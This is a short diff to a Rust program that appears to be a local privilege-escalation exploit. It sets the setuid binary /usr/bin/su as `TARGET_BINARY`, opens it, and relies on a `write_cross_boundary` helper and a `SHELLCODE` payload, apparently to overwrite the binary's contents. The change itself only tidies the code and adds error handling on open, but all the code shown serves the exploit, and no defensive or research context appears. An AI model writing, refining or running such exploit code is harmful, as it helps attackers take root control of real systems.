@@ -219,9 +219,15 @@ fn write_cross_boundary(file_descriptor: i32, offset: usize, chunk: &[u8; 4]) {
     }
 }
 
+const TARGET_BINARY: &str = "/usr/bin/su";
+
 fn main() {
-    let path = Path::new("/usr/bin/su");
-    let file = File::open(path).unwrap();
+    let path = Path::new(TARGET_BINARY);
+    let file = File::open(path).unwrap_or_else(|err| {
+        eprintln!("failed to open {}: {}", TARGET_BINARY, err);
+        std::process::exit(1)
+    });
+
     let file_descriptor = file.as_raw_fd();
 
     SHELLCODE
